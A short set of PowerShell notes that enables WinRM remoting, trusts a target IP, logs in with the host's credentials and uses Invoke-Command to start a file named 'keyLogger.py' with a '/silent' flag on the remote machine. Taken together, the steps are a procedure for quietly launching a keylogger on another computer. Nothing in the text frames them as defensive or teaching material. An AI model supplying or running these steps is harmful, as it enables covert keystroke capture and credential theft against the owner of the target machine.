To run a file already installed on another computer:
Run Powershell as admin:

>> Enable-PSRemoting -Force
<# This command starts the WinRM service and creates firewall rules that allow incoming connections. The -Force part of the cmdlet tells PowerShell to perform these actions without prompting user for each step. #>
>> Set-Item wsman:\localhost\client\trustedhosts hostComputerIPAddress
>> Restart-Service WinRM
>> Test wsman hostComputerIPAddress
>> Enter-PSSession -ComputerName hostComputerIPAddress -credential host_user 
# enter host login username & password
>> Invoke-Command –ComputerName hostComputerIPAddress –ScriptBlock {Start-Process "file_path\keyLogger.py" /silent}
>> Exit-PSSession
